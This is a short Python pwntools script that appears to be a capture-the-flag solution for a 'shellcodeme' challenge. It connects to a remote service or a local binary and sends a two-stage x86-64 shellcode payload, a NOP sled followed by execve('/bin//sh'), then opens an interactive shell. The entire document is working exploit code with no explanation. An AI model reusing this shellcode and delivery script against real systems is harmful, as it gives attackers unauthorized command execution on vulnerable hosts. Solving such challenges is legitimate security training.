from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    seen = [0 for i in range(257)]
    shellcode = '\x5a\x55\x5e\x5f\x5f\x58\x0f\x05'
    print(hex(seen[256]))
    proc.sendline(shellcode)
    shellcode = '\x90' * 8
    shellcode += '\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53'
    shellcode += '\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
    raw_input('wait')
    proc.sendline(shellcode)


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc shellcodeme.420blaze.in 420'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./shellcodeme'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
